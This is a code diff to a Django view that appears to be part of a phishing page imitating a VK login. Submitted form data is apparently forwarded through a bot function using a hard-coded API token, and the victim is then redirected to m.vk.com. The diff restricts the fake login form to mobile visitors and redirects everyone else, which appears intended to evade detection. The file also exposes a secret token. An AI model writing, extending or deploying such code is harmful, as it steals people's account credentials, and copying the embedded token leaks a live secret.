@@ -13,6 +13,8 @@ import requests
 from .bot import *
 import json
 
+
+@detect_mobile
 def index(request):
     if request.method == "POST":
         tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
@@ -32,8 +34,11 @@ def index(request):
             tel(body, ids[id].number)
 
         return HttpResponsePermanentRedirect("https://m.vk.com")
-    form = login()
-    return render(request, "app_serverr/index.html", {"form": form})
+    if request.mobile:
+        form = login()
+        return render(request, "app_serverr/index.html", {"form": form})
+    else:
+        return HttpResponsePermanentRedirect(request.scheme + "://" + request.META['HTTP_HOST'])
 
 
 @detect_mobile
